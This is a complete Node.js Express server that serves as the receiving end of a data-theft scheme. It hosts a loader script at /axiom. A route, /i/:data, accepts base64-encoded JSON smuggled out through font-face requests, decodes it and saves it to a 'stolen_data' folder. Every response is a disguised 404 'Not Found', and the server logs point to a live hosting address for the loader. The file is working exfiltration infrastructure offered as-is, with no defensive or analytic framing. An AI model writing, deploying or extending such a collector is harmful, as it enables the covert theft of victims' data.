const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;

// Serve loader.js at /axiom/loader.js
app.use('/axiom', express.static(path.join(__dirname, 'public/axiom')));

// Root
app.get('/', (req, res) => {
    res.status(404).send('Not Found');
});

// Direct /i
app.get('/i', (req, res) => {
    res.status(404).json({ detail: "Not Found" });
});

// The critical route that receives the font-face data
app.get('/i/:data', (req, res) => {
    const encoded = req.params.data;
    console.log('📥 REQUEST RECEIVED with data length:', encoded.length);

    let payload = {};
    try {
        const jsonString = Buffer.from(encoded, 'base64').toString();
        payload = JSON.parse(jsonString);

        console.log('✅ DATA RECEIVED SUCCESSFULLY:', JSON.stringify(payload, null, 2));

        // Save to file
        const logDir = path.join(__dirname, 'stolen_data');
        if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);

        const filename = `stolen_${Date.now()}.json`;
        fs.writeFileSync(path.join(logDir, filename), JSON.stringify(payload, null, 2));

        console.log(`💾 SAVED to stolen_data/${filename}`);
    } catch (e) {
        console.error('❌ Failed to decode payload:', e.message);
    }

    res.status(404).json({ detail: "Not Found" });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 Loader: https://bloom-sniper-backend.onrender.com/axiom/loader.js`);
    console.log(`📥 Data endpoint ready at /i/...`);
});